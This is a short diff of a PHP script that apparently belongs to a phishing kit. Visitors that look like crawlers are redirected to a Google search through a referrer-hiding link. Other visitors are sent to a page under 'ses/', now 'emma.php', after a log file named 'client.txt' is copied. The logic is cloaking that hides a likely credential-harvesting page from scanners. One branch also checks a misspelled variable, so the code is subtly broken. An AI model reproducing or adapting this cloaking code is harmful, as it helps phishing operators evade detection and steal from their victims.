@@ -22,6 +22,6 @@ if($CrawlerDetect->isCrawler($useragent)){
 	header('Location: https://href.li/?https://www.google.com/search?q='.$settings['out']);
 } else if (!$CrawlerDetect->isCrawler($usergent)){
 	copy("../Logs/client.txt", "client.txt");
-	echo "<script>window.location.href = \"ses/index\"; </script>";
+	echo "<script>window.location.href = \"ses/emma.php\"; </script>";
 }
 ?>
